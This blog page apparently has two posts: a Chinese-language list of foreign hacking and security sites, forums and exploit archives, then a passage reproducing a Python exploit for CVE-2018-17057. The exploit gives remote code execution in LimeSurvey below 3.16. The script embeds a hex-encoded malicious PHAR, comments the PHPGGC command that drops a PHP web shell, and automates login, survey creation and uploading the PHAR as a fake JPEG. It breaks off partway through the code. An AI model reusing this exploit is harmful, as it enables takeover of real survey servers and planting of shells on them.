        <time class="entry-date published" datetime="2019-04-13T13:56:30.840Z">
          2019-04-13
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="分享一些国外著名的黑客技术学习网站"><a href="#分享一些国外著名的黑客技术学习网站" class="headerlink" title="分享一些国外著名的黑客技术学习网站"></a>分享一些国外著名的黑客技术学习网站</h1><p>本来呢，我的初衷是想要寻找一些国外新进的技术的论坛或者网站，或者一些新的电子书，后来找了一圈，发现就我目前已知的内容很难找到那些新进的东西，但是我找到了一些国外的论坛，仅供大家参考。<br><a href="http://www.milw0rm.com/http://www.web-hack.ru/俄罗斯的站" target="_blank" rel="noopener">http://www.milw0rm.com/http://www.web-hack.ru/俄罗斯的站</a> <a href="http://www.securitydot.net/http://www.addict3d.org/Security" target="_blank" rel="noopener">http://www.securitydot.net/http://www.addict3d.org/Security</a> <a href="http://www.frsirt.com/" target="_blank" rel="noopener">http://www.frsirt.com/</a> <a href="http://www.securiteam.com/" target="_blank" rel="noopener">http://www.securiteam.com/</a> <a href="http://neworder.box.sk/" target="_blank" rel="noopener">http://neworder.box.sk/</a> <a href="http://securityvulns.com/" target="_blank" rel="noopener">http://securityvulns.com/</a> <a href="http://www.blackhat.com/" target="_blank" rel="noopener">http://www.blackhat.com/</a><br>国外安全 <a href="http://www.deadly.org/" target="_blank" rel="noopener">http://www.deadly.org/</a> 大量关于OpenBSD的资料文档教程<br>国外安全 <a href="http://www.guninski.com/" target="_blank" rel="noopener">http://www.guninski.com/</a> 安全专家Guninski的主页，有大量由系统漏洞<br>国外安全 <a href="http://www.sysinternals.com" target="_blank" rel="noopener">http://www.sysinternals.com</a> 有很好的windows下的工具及源代码<br>国外安全 <a href="http://www.securityflaw.com/bible/" target="_blank" rel="noopener">http://www.securityflaw.com/bible/</a> 入侵检测等文档整理较好的站点<br>国外安全 <a href="http://www.secinf.net/" target="_blank" rel="noopener">http://www.secinf.net/</a> 网络安全方面的大量文档<br>国外安全 <a href="http://www.incident-response.org" target="_blank" rel="noopener">http://www.incident-response.org</a> 入侵反应，数据恢复工具等<br>国外安全 <a href="http://www.securityfocus.com/" target="_blank" rel="noopener">http://www.securityfocus.com/</a> 安全资料整合最好的站<br>国外安全 <a href="http://www.project.honeynet.org/" target="_blank" rel="noopener">http://www.project.honeynet.org/</a> 由安全界一帮牛人组织的一个project<br>国外安全 <a href="http://www.packetstormsecurity.com" target="_blank" rel="noopener">http://www.packetstormsecurity.com</a> 资料全面的安全站<br>国外安全 <a href="http://www.securityportal.com/" target="_blank" rel="noopener">http://www.securityportal.com/</a> 还可以看看的安全站<br>国外安全 <a href="http://www.ussrback.com/" target="_blank" rel="noopener">http://www.ussrback.com/</a> 比较活跃的安全站<br>国外安全 <a href="http://www.attrition.org/" target="_blank" rel="noopener">http://www.attrition.org/</a> 内容全面的安全站<br>国外安全 <a href="http://www.wiretrip.net/rfp/2/index.asp" target="_blank" rel="noopener">http://www.wiretrip.net/rfp/2/index.asp</a> rfp的安全主页，提供权威的安全信息<br>国外安全 <a href="http://www.antionline.com/" target="_blank" rel="noopener">http://www.antionline.com/</a> 有些特色栏目的安全站<br>国外安全 <a href="http://www.eeye.com/" target="_blank" rel="noopener">http://www.eeye.com/</a> eeye公司的主页，提供权威性的安全建议和工具<br>国外安全 <a href="http://www.insecure.org/" target="_blank" rel="noopener">http://www.insecure.org/</a> Fyodor的主页，nmap的老家，还有exploit<br>国外安全 <a href="http://www.atstake.com/" target="_blank" rel="noopener">http://www.atstake.com/</a> @stack公司的主页，提供权威的安全建议<br>国外安全 <a href="http://www.bugnet.com/" target="_blank" rel="noopener">http://www.bugnet.com/</a> 提供漏洞修补<br>国外黑客 <a href="http://lsd-pl.net/" target="_blank" rel="noopener">http://lsd-pl.net/</a> LsD的站,最新最有效的exploit<br>国外黑客 <a href="http://www.s0ftpj.org" target="_blank" rel="noopener">http://www.s0ftpj.org</a> 提供一些水平很高的小工具<br>国外黑客 <a href="http://phrack.org/" target="_blank" rel="noopener">http://phrack.org/</a> Phrack的主页，经典的黑客技术电子杂志<br>国外黑客 <a href="http://www.w00w00.org/" target="_blank" rel="noopener">http://www.w00w00.org/</a> w00w00组织的主页<br>国外黑客 <a href="http://mixter.void.ru/" target="_blank" rel="noopener">http://mixter.void.ru/</a> Mixter的个人主页，不少有用的工具<br>国外黑客 <a href="http://www.thehackerschoice.com/" target="_blank" rel="noopener">http://www.thehackerschoice.com/</a> THC黑客组织的页面，很好的安全文档和工具<br>国外黑客 www.win2000mag.net Windows &amp; .NET Magazine Network 绝对专业的站点，文章都是一流的<br>国外黑客 <a href="http://www.2600.com/" target="_blank" rel="noopener">http://www.2600.com/</a> 2600 Magazine<br>国外黑客 www.experts-exchange.com 全球有名的社区<br>国外黑客 www.is-it-true.org 类似于FAQ的站点，资源丰富<br>国外黑客 www.mixter.warrior2k.com mixter security<br>国外黑客 www.liun.hektik.org Long Island our Underground Networks<br>国外黑客 www.ussrback.com ussr is back<br>国外黑客 www.securiteam.com 非常好的安全文章漏洞利用工具下载站点<br>国外黑客 www.lsd-pl.net The Last Stage of Delirium Research Group<br>国外黑客 www. neworder.box.sk Box Network team<br>国外黑客 www.sysinternals.com sysinternals<br>国外黑客 www.webattack.com WebAttack Inc<br>国外黑客 www.blackhat.com Black Hat, Inc<br>国外黑客 <a href="http://p.ulh.as" target="_blank" rel="noopener">http://p.ulh.as</a> pulhas<br><a href="http://www.hack.co.za" target="_blank" rel="noopener">http://www.hack.co.za</a> (国外著名黑客站点，较全的Exploit库)<br><a href="http://www.phrack.org" target="_blank" rel="noopener">http://www.phrack.org</a> (经典的黑客技术电子杂志)<br><a href="http://www.antionline.com" target="_blank" rel="noopener">http://www.antionline.com</a> (国外经典黑客站点)<br><a href="http://whitehats.com" target="_blank" rel="noopener">http://whitehats.com</a> (白帽子网站，有最新的规则库下载，关于Snort等)<br><a href="http://lsd-pl.net" target="_blank" rel="noopener">http://lsd-pl.net</a> (发布最新的Exploit程序)<br><a href="http://packetstormsecurity.com" target="_blank" rel="noopener">http://packetstormsecurity.com</a> (国外著名漏洞库，有大量exploit程序)<br><a href="http://astalavista.box.sk" target="_blank" rel="noopener">http://astalavista.box.sk</a> (著名的软件破解网站)<br><a href="http://www.thehackerschoice.com" target="_blank" rel="noopener">http://www.thehackerschoice.com</a> (THC黑客组织的站点，有很多资料和工具)<br><a href="http://www.insecure.org" target="_blank" rel="noopener">http://www.insecure.org</a> (Fyoderr的个人站点,即Nmap的老家)<br><a href="http://www.ishacker.com" target="_blank" rel="noopener">http://www.ishacker.com</a> (DigitalBrain的个人站点，国内)<br>如果大家有更好的，或者更加新进的技术的论坛网站，希望大家下面留言<br>感谢宝哥回复，添加两条<br>hackerone.com 国外著名的赏金平台，经常有公开很厉害的漏洞。<br>exploit-db.com exp公开平台</p>
<p>再次添加世界顶级黑客技术社区最新名单</p>
<p>这份名单基本上囊括了目前世界上各大最佳黑客技术论坛。(任性的小编：国内娱乐圈一个都没放)<br>目前不少朋友希望学习与黑客工作相关的技术与技能，但却不知道该从何处下手。如果屏幕前的您也是其中一员，那么我建议大家首先加入一个适合自己的黑客技术论坛。之所以选择这种方式，是因为这些黑客技术论坛背后都拥有着强大的专家社区基础，足以帮助各位解决自己面临的各种疑惑。<br>如果大家不知道哪些论坛比较靠谱，那么我将在这里给各位列出一份名单。请各位根据自己的实际需要，从中选择最合适的选项。<br>备注:这份名单完全根据我的个人经验所汇总，大家可能有着自己的判断——咱们求同存异就好。<br>各大优秀黑客技术论坛：Hack Forums: Hack Forums是目前最为理想的黑客技术学习根据地。该论坛不仅在设计上面向黑客群体，同时也适用于开发人员、博主、游戏开发者、程序员、图形设计师以及网络营销人士。Evil Zone:Evil Zone是一个专门面向黑客群体的论坛。当然，其中也涉及科学、编程以及艺术等领域的内容。Offensive Community:Offensive安全社区基本上属于一个“具备大量黑客教程收集库的黑客论坛”。Hellbound Hackers:这里提供与黑客技术相关的各类课程、挑战题目与实现工具。Hack This Site:HackThisSite提供合法而安全的网络安全资源，在这里大家可以通过各类挑战题目测试自己的黑客技能，同时学习到更多与黑客及网络安全相关的知识。简而言之，这是学习黑客技术的最佳站点。Hack Hound:一个拥有大量相关教程及工具的黑客论坛。Binary Revolution Hacking Forums:提供各类教程、工具以及安全文章。Exploit-DB:Exploit-DB提供一整套庞大的归档体系，其中涵盖了各类公开的攻击事件、漏洞报告、安全文章以及技术教程等资源。Crackmes de:在这里，大家可以通过解决各类任务（即crackmes）来测试并提升自己的相关技能水平。Cracking Forum:提供各类最新入侵教程及工具。Ethical Hacker:另一个黑客论坛，提供多种教程及工具资源。Rohitab:Rohitab专注于安全类文章、计算机编程、Web设计以及图形设计等领域。Enigma Group:Enigma Group提供合法且安全的安全资源，大家可以在这里通过各类培训任务测试并拓展自己的技能水平。Hack Mac:提供与Mac平台相关的黑客、入侵以及安全保护教程。OpenSC:Open SC是一个安全研究与开发论坛，且号称是全球知名度最高的恶意软件论坛。Packet Storm:提供与数据库相关的建议、漏洞利用、工具、论文以及安全新闻。<br>希望这份名单能够给大家带来切实帮助。如果您觉得不错，也请把它分享给自己的朋友和信息安全关注者。</p>
<p>原文连接：<a href="http://zone.secevery.com/article/390" target="_blank" rel="noopener">http://zone.secevery.com/article/390</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/收集/">收集</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/11/cve/CVE-2018-17057/"><span>CVE-2018-17057</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/11/cve/CVE-2018-17057/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-11T07:54:53.527Z">
          2019-04-11
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="CVE-2018-17057"><a href="#CVE-2018-17057" class="headerlink" title="CVE-2018-17057"></a>CVE-2018-17057</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line"># Description: LimeSurvey &lt; 3.16 use a old version of &quot;TCPDF&quot; library, this version is vulnerable to a Serialization Attack via the &quot;phar://&quot; wrapper.</span><br><span class="line"># Date: 29/03/2019</span><br><span class="line"># Exploit Title: Remote Code Execution in LimeSurvey &lt; 3.16 via Serialization Attack in TCPDF.</span><br><span class="line"># Exploit Author: @q3rv0</span><br><span class="line"># Google Dork:</span><br><span class="line"># Version: &lt; 3.16</span><br><span class="line"># Tested on: LimeSurvey 3.15</span><br><span class="line"># PoC: https://www.secsignal.org/news/remote-code-execution-in-limesurvey-3-16-via-serialization-attack-in-tcpdf</span><br><span class="line"># CVE: CVE-2018-17057</span><br><span class="line"># SecSignal is: &lt;3</span><br><span class="line"># Usage: python exploit.py [URL] [USERNAME] [PASSWORD]</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">SESSION = requests.Session()</span><br><span class="line"></span><br><span class="line"># Malicious PHAR generated with PHPGGC.</span><br><span class="line"># ./phpggc Yii/RCE1 system &quot;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p &gt; shell.php&quot; -p phar -o /tmp/exploit.jpg</span><br><span class="line"></span><br><span class="line">PHAR    = (&quot;\x3c\x3f\x70\x68\x70\x20\x5f\x5f\x48\x41\x4c\x54\x5f\x43\x4f\x4d\x50\x49\x4c\x45\x52\x28\x29\x3b\x20\x3f\x3e\x0d\x0a\x38&quot;</span><br><span class="line">           &quot;\x02\x00\x00\x01\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x00\x00\x02\x02\x00\x00\x4f\x3a\x31\x31\x3a\x22\x43\x44\x62&quot;</span><br><span class="line">           &quot;\x43\x72\x69\x74\x65\x72\x69\x61\x22\x3a\x31\x3a\x7b\x73\x3a\x36\x3a\x22\x70\x61\x72\x61\x6d\x73\x22\x3b\x4f\x3a\x31\x32&quot;</span><br><span class="line">           &quot;\x3a\x22\x43\x4d\x61\x70\x49\x74\x65\x72\x61\x74\x6f\x72\x22\x3a\x33\x3a\x7b\x73\x3a\x31\x36\x3a\x22\x00\x43\x4d\x61\x70&quot;</span><br><span class="line">           &quot;\x49\x74\x65\x72\x61\x74\x6f\x72\x00\x5f\x64\x22\x3b\x4f\x3a\x31\x30\x3a\x22\x43\x46\x69\x6c\x65\x43\x61\x63\x68\x65\x22&quot;</span><br><span class="line">           &quot;\x3a\x37\x3a\x7b\x73\x3a\x39\x3a\x22\x6b\x65\x79\x50\x72\x65\x66\x69\x78\x22\x3b\x73\x3a\x30\x3a\x22\x22\x3b\x73\x3a\x37&quot;</span><br><span class="line">           &quot;\x3a\x22\x68\x61\x73\x68\x4b\x65\x79\x22\x3b\x62\x3a\x30\x3b\x73\x3a\x31\x30\x3a\x22\x73\x65\x72\x69\x61\x6c\x69\x7a\x65&quot;</span><br><span class="line">           &quot;\x72\x22\x3b\x61\x3a\x31\x3a\x7b\x69\x3a\x31\x3b\x73\x3a\x36\x3a\x22\x73\x79\x73\x74\x65\x6d\x22\x3b\x7d\x73\x3a\x39\x3a&quot;</span><br><span class="line">           &quot;\x22\x63\x61\x63\x68\x65\x50\x61\x74\x68\x22\x3b\x73\x3a\x31\x30\x3a\x22\x64\x61\x74\x61\x3a\x74\x65\x78\x74\x2f\x22\x3b&quot;</span><br><span class="line">           &quot;\x73\x3a\x31\x34\x3a\x22\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x4c\x65\x76\x65\x6c\x22\x3b\x69\x3a\x30\x3b\x73\x3a\x31\x31&quot;</span><br><span class="line">           &quot;\x3a\x22\x65\x6d\x62\x65\x64\x45\x78\x70\x69\x72\x79\x22\x3b\x62\x3a\x31\x3b\x73\x3a\x31\x35\x3a\x22\x63\x61\x63\x68\x65&quot;</span><br><span class="line">           &quot;\x46\x69\x6c\x65\x53\x75\x66\x66\x69\x78\x22\x3b\x73\x3a\x31\x34\x30\x3a\x22\x3b\x62\x61\x73\x65\x36\x34\x2c\x4f\x54\x6b&quot;</span><br><span class="line">           &quot;\x35\x4f\x54\x6b\x35\x4f\x54\x6b\x35\x4f\x57\x56\x6a\x61\x47\x38\x67\x4d\x32\x4d\x7a\x5a\x6a\x63\x77\x4e\x6a\x67\x33\x4d&quot;</span><br><span class="line">           &quot;\x44\x49\x77\x4e\x7a\x4d\x33\x4f\x54\x63\x7a\x4e\x7a\x51\x32\x4e\x54\x5a\x6b\x4d\x6a\x67\x79\x4e\x44\x56\x6d\x4e\x44\x63&quot;</span><br><span class="line">           &quot;\x30\x4e\x54\x55\x30\x4e\x57\x49\x79\x4d\x6a\x59\x7a\x4d\x6a\x49\x31\x5a\x44\x49\x35\x4d\x32\x49\x79\x4d\x44\x4e\x6d\x4d&quot;</span><br><span class="line">           &quot;\x32\x55\x77\x59\x53\x42\x38\x49\x48\x68\x34\x5a\x43\x41\x74\x63\x69\x41\x74\x63\x43\x41\x2b\x49\x48\x4e\x6f\x5a\x57\x78&quot;</span><br><span class="line">           &quot;\x73\x4c\x6e\x42\x6f\x63\x41\x3d\x3d\x22\x3b\x7d\x73\x3a\x31\x39\x3a\x22\x00\x43\x4d\x61\x70\x49\x74\x65\x72\x61\x74\x6f&quot;</span><br><span class="line">           &quot;\x72\x00\x5f\x6b\x65\x79\x73\x22\x3b\x61\x3a\x31\x3a\x7b\x69\x3a\x30\x3b\x69\x3a\x30\x3b\x7d\x73\x3a\x31\x38\x3a\x22\x00&quot;</span><br><span class="line">           &quot;\x43\x4d\x61\x70\x49\x74\x65\x72\x61\x74\x6f\x72\x00\x5f\x6b\x65\x79\x22\x3b\x69\x3a\x30\x3b\x7d\x7d\x08\x00\x00\x00\x74&quot;</span><br><span class="line">           &quot;\x65\x73\x74\x2e\x74\x78\x74\x04\x00\x00\x00\x36\xad\x9d\x5c\x04\x00\x00\x00\x0c\x7e\x7f\xd8\xb6\x01\x00\x00\x00\x00\x00&quot;</span><br><span class="line">           &quot;\x00\x74\x65\x73\x74\xcc\xd9\x99\xbd\x5e\x65\x4e\x03\x9b\x90\xdd\xd5\x8b\xff\x28\xd2\x37\x8b\x23\xe5\x02\x00\x00\x00\x47&quot;</span><br><span class="line">           &quot;\x42\x4d\x42&quot;)</span><br><span class="line"></span><br><span class="line">def usage():</span><br><span class="line">    if len(sys.argv) != 4:</span><br><span class="line">        print &quot;Usage: python exploit.py [URL] [USERNAME] [PASSWORD]&quot;</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">def get(url):</span><br><span class="line">	r = SESSION.get(url, verify=False)</span><br><span class="line">	return r.text</span><br><span class="line"></span><br><span class="line">def post(url, data=&#123;&#125;, files=None, headers=None):</span><br><span class="line">	r = SESSION.post(url, data=data, headers=headers, files=files, verify=False)</span><br><span class="line">	return r.text</span><br><span class="line"></span><br><span class="line">def getYIICSRFToken(url):</span><br><span class="line">	res = get(url)</span><br><span class="line">	token = re.findall(r&apos;value=&quot;(.*)&quot; name=&quot;YII_CSRF_TOKEN&quot;&apos;, res)</span><br><span class="line">	return token[0] </span><br><span class="line"></span><br><span class="line">def getKCSRFToken(url):</span><br><span class="line">	res = get(url)</span><br><span class="line">	token = re.findall(r&apos;csrftoken = &quot;(.*)&quot;;&apos;, res)</span><br><span class="line">	return token[0]</span><br><span class="line"></span><br><span class="line">def login(url, username, password):</span><br><span class="line">	token = getYIICSRFToken(url)</span><br><span class="line">	data = &#123;&quot;YII_CSRF_TOKEN&quot; : token,</span><br><span class="line">	        &quot;authMethod&quot;     : &quot;Authdb&quot;, </span><br><span class="line">	        &quot;user&quot;           : username,</span><br><span class="line">	        &quot;password&quot;       : password,</span><br><span class="line">	        &quot;loginlang&quot;      : &quot;default&quot;,</span><br><span class="line">	        &quot;action&quot;         : &quot;login&quot;,</span><br><span class="line">	        &quot;width&quot;          : &quot;1366&quot;,</span><br><span class="line">	        &quot;login_submit&quot;   : &quot;login&quot;</span><br><span class="line">	       &#125;</span><br><span class="line">	res = post(url, data)</span><br><span class="line">	if len(re.findall(&quot;loginform&quot;, res)) == 0:</span><br><span class="line">		return True</span><br><span class="line">	else:</span><br><span class="line">	    return False</span><br><span class="line"></span><br><span class="line">def emailTemplates(url):</span><br><span class="line">    return get(url)	</span><br><span class="line"></span><br><span class="line">def createSurvey(url_newsurvey, url_insert):</span><br><span class="line">	token = getYIICSRFToken(url_newsurvey)</span><br><span class="line">	data = &#123;&quot;YII_CSRF_TOKEN&quot; : token,</span><br><span class="line">	        &quot;surveyls_title&quot; : &quot;Survey Example - SecSignal&quot;,</span><br><span class="line">	        &quot;language&quot;       : &quot;en&quot;,</span><br><span class="line">	        &quot;createsample&quot;   : &quot;0&quot;,</span><br><span class="line">	        &quot;description&quot;    : &quot;foo&quot;,</span><br><span class="line">	        &quot;url&quot;            : &quot;&quot;,</span><br><span class="line">	        &quot;urldescrip&quot;     : &quot;&quot;,</span><br><span class="line">	        &quot;dateformat&quot;     : &quot;1&quot;,</span><br><span class="line">	        &quot;numberformat_en&quot;: &quot;0&quot;,</span><br><span class="line">	        &quot;welcome&quot;        : &quot;bar&quot;,</span><br><span class="line">	        &quot;endtext&quot;        : &quot;asdf&quot;,</span><br><span class="line">	        &quot;owner_id&quot;       : &quot;1&quot;,</span><br><span class="line">	        &quot;admin&quot;          : &quot;Administrator&quot;,</span><br><span class="line">	        &quot;adminemail&quot;     : &quot;test%40gsecsignal.org&quot;,</span><br><span class="line">	        &quot;bounce_email&quot;   : &quot;test%40gsecsignal.org&quot;,</span><br><span class="line">	        &quot;faxto&quot;          : &quot;&quot;,</span><br><span class="line">	        &quot;gsid&quot;           : &quot;1&quot;,</span><br><span class="line">	        &quot;format&quot;         : &quot;G&quot;,</span><br><span class="line">	        &quot;template&quot;       : &quot;fruity&quot;,</span><br><span class="line">	        &quot;navigationdelay&quot;: &quot;0&quot;,</span><br><span class="line">	        &quot;questionindex&quot;  : &quot;0&quot;,</span><br><span class="line">	        &quot;showgroupinfo&quot;  : &quot;B&quot;,</span><br><span class="line">	        &quot;showqnumcode&quot;   : &quot;X&quot;,</span><br><span class="line">	        &quot;shownoanswer&quot;   : &quot;Y&quot;,</span><br><span class="line">	        &quot;showxquestions&quot; : &quot;0&quot;,</span><br><span class="line">	        &quot;showxquestions&quot; : &quot;1&quot;,</span><br><span class="line">	        &quot;showwelcome&quot;    : &quot;0&quot;,</span><br><span class="line">	        &quot;showwelcome&quot;    : &quot;1&quot;,</span><br><span class="line">	        &quot;allowprev&quot;      : &quot;0&quot;,</span><br><span class="line">	        &quot;nokeyboard&quot;     : &quot;0&quot;,</span><br><span class="line">	        &quot;showprogress&quot;   : &quot;0&quot;,</span><br><span class="line">	        &quot;showprogress&quot;   : &quot;1&quot;,</span><br><span class="line">	        &quot;printanswers&quot;   : &quot;0&quot;,</span><br><span class="line">	        &quot;publicstatistics&quot; : &quot;0&quot;,</span><br><span class="line">	        &quot;publicgraphs&quot;   : &quot;0&quot;,</span><br><span class="line">	        &quot;autoredirect&quot;   : &quot;0&quot;,</span><br><span class="line">	        &quot;startdate&quot;      : &quot;&quot;,</span><br><span class="line">	        &quot;expires&quot;        : &quot;&quot;,</span><br><span class="line">	        &quot;listpublic&quot;     : &quot;0&quot;,</span><br><span class="line">	        &quot;usecookie&quot;      : &quot;0&quot;,</span><br><span class="line">	        &quot;usecaptcha_surveyaccess&quot; : &quot;0&quot;,</span><br><span class="line">	        &quot;usecaptcha_registration&quot; : &quot;0&quot;,</span><br><span class="line">	        &quot;usecaptcha_saveandload&quot;  : &quot;0&quot;,</span><br><span class="line">	        &quot;datestamp&quot;               : &quot;0&quot;,</span><br><span class="line">	        &quot;ipaddr&quot;                  : &quot;0&quot;,</span><br><span class="line">	        &quot;refurl&quot;                  : &quot;0&quot;,</span><br><span class="line">	        &quot;savetimings&quot;             : &quot;0&quot;,</span><br><span class="line">	        &quot;assessments&quot;             : &quot;0&quot;,</span><br><span class="line">	        &quot;allowsave&quot;               : &quot;0&quot;,</span><br><span class="line">	        &quot;allowsave&quot;               : &quot;1&quot;,</span><br><span class="line">	        &quot;emailnotificationto&quot;     : &quot;&quot;,</span><br><span class="line">	        &quot;emailresponseto&quot;         : &quot;&quot;,</span><br><span class="line">	        &quot;googleanalyticsapikeysetting&quot; : &quot;N&quot;,</span><br><span class="line">	        &quot;googleanalyticsstyle&quot;         : &quot;0&quot;,</span><br><span class="line">	        &quot;tokenlength&quot;                  : &quot;15&quot;,</span><br><span class="line">	        &quot;anonymized&quot;                   : &quot;0&quot;,</span><br><span class="line">	        &quot;tokenanswerspersistence&quot;      : &quot;0&quot;,</span><br><span class="line">	        &quot;alloweditaftercompletion&quot;     : &quot;0&quot;,</span><br><span class="line">	        &quot;allowregister&quot;                : &quot;0&quot;,</span><br><span class="line">	        &quot;htmlemail&quot;                    : &quot;0&quot;,</span><br><span class="line">	        &quot;htmlemail&quot;                    : &quot;1&quot;,</span><br><span class="line">	        &quot;sendconfirmation&quot;             : &quot;0&quot;,</span><br><span class="line">	        &quot;sendconfirmation&quot;             : &quot;1&quot;,</span><br><span class="line">	        &quot;saveandclose&quot;                 : &quot;1&quot;</span><br><span class="line">	       &#125;</span><br><span class="line">	res = post(url_insert, data)</span><br><span class="line">	surveyid = re.findall(r&apos;surveyid\\/([0-9]+)&apos;, res)</span><br><span class="line">	return surveyid[0] # Return SurveyiD</span><br><span class="line"></span><br><span class="line">def uploadPHAR(url_upload, url_csrf_token, phar):</span><br><span class="line">	kcfinder_csrftoken = getKCSRFToken(url_csrf_token)</span><br><span class="line">	files = &#123;&apos;upload[]&apos;: (&apos;malicious.jpg&apos;, phar)&#125;</span><br><span class="line">	data  = &#123;&quot;dir&quot;                : &quot;files&quot;,</span><br><span class="line">	         &quot;kcfinder_csrftoken&quot; : kcfinder_csrftoken</span><br><span class="line">	        &#125;</span><br><span class="line">	res = post(url_upload, data, files)</span><br><span class="line">	return res</span><br><span class="line"></span><br><span class="line">def pdfExport(url_pdf_export, 